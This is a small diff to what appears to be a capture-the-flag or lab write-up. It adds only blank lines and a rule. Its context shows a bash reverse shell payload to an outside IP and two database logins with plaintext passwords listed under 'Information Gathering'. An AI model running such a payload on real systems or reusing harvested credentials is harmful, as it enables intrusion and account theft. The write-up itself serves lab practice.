@@ -273,8 +273,11 @@ Reverse Shell Payload: `bash -c 'bash -i >& /dev/tcp/10.10.14.34/9001 0>&1'`
 ## Information Gathering
 ![image](https://user-images.githubusercontent.com/83878909/229379861-82079dfc-6543-4706-809a-ebe5f4d2518f.png)
 - DB User: `unixusrmgr:dheu%7wjx8B&`
+
 ![image](https://user-images.githubusercontent.com/83878909/229379727-6b8f9f3a-9fa8-4c2a-a46e-c542fd0e72bb.png)
 - DB User: `dbcross:LOSPxnme4f5pH5wp`
+
+---
 
 
 
